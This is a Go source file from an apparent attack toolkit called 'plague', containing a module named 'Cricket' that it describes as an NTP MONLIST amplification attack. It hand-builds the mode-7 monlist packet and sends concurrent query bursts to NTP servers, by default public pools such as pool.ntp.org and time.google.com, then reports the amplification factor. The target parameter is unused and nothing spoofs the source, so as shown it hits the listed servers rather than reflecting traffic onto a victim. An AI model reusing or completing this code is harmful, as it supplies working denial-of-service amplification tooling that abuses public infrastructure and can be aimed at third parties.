package plague

import (
	"context"
	"fmt"
	"net"
	"sync"
	"sync/atomic"
	"time"
)

// Cricket implements NTP amplification attack (MONLIST).
// Exploits NTP servers that respond to monlist queries with large responses.
type Cricket struct {
	servers []string
}

// NewCricket creates a new Cricket NTP amplification attack.
func NewCricket(servers []string) *Cricket {
	if len(servers) == 0 {
		// Note: Most modern NTP servers have disabled monlist
		servers = []string{
			"pool.ntp.org:123",
			"time.google.com:123",
			"time.cloudflare.com:123",
		}
	}
	return &Cricket{servers: servers}
}

// Name returns the attack name.
func (c *Cricket) Name() string {
	return "Cricket"
}

// Description returns a brief description.
func (c *Cricket) Description() string {
	return "Cricket Swarm - NTP MONLIST amplification (servers chirp back en masse)"
}

// Attack executes the NTP amplification attack.
func (c *Cricket) Attack(ctx context.Context, target string, opts AttackOpts) (*Result, error) {
	if opts.Concurrency <= 0 {
		opts.Concurrency = 50
	}
	if opts.Rounds <= 0 {
		opts.Rounds = 1000
	}

	var (
		successful    atomic.Int64
		failed        atomic.Int64
		completed     atomic.Int64
		totalRespSize atomic.Int64
	)

	start := time.Now()

	// NTP monlist query (mode 7, opcode 42)
	ntpQuery := buildNTPMonlistQuery()
	querySize := len(ntpQuery)

	jobs := make(chan int, opts.Rounds)
	var wg sync.WaitGroup

	for i := 0; i < opts.Concurrency; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for {
				select {
				case <-ctx.Done():
					return
				case idx, ok := <-jobs:
					if !ok {
						return
					}
					server := c.servers[idx%len(c.servers)]
					respSize, ok := c.sendNTPQuery(ctx, server, ntpQuery)
					if ok {
						successful.Add(1)
						totalRespSize.Add(int64(respSize))
					} else {
						failed.Add(1)
					}
					current := completed.Add(1)

					if opts.Verbose && current%100 == 0 {
						fmt.Printf("\r   Progress: %d/%d queries", current, opts.Rounds)
					}

					if opts.Delay > 0 {
						time.Sleep(opts.Delay)
					}
				}
			}
		}()
	}

	for i := 0; i < opts.Rounds; i++ {
		select {
		case <-ctx.Done():
			break
		case jobs <- i:
		}
	}
	close(jobs)

	wg.Wait()

	if opts.Verbose {
		fmt.Println()
	}

	ampFactor := float64(0)
	if successful.Load() > 0 {
		avgRespSize := float64(totalRespSize.Load()) / float64(successful.Load())
		ampFactor = avgRespSize / float64(querySize)
	}

	return &Result{
		TotalRequests: int(completed.Load()),
		Successful:    int(successful.Load()),
		Failed:        int(failed.Load()),
		Duration:      time.Since(start),
		Amplification: ampFactor,
	}, nil
}

// sendNTPQuery sends an NTP query and returns response size.
func (c *Cricket) sendNTPQuery(ctx context.Context, server string, query []byte) (int, bool) {
	conn, err := net.DialTimeout("udp", server, 2*time.Second)
	if err != nil {
		return 0, false
	}
	defer conn.Close()

	conn.SetDeadline(time.Now().Add(2 * time.Second))

	_, err = conn.Write(query)
	if err != nil {
		return 0, false
	}

	buf := make([]byte, 65535)
	n, err := conn.Read(buf)
	if err != nil {
		return 0, false
	}

	return n, true
}

// buildNTPMonlistQuery builds an NTP mode 7 monlist query.
// Monlist can return up to 600 entries of 72 bytes each.
func buildNTPMonlistQuery() []byte {
	// NTP mode 7 (private mode) packet
	query := make([]byte, 8)

	// Byte 0: LI=0, VN=2, Mode=7 (private)
	query[0] = 0x17

	// Byte 1: Response/Error/More flags = 0, Auth = 0, Sequence = 0
	query[1] = 0x00

	// Byte 2: Implementation = 3 (XNTPD)
	query[2] = 0x03

	// Byte 3: Request code = 42 (REQ_MON_GETLIST_1) for monlist
	query[3] = 0x2a

	return query
}
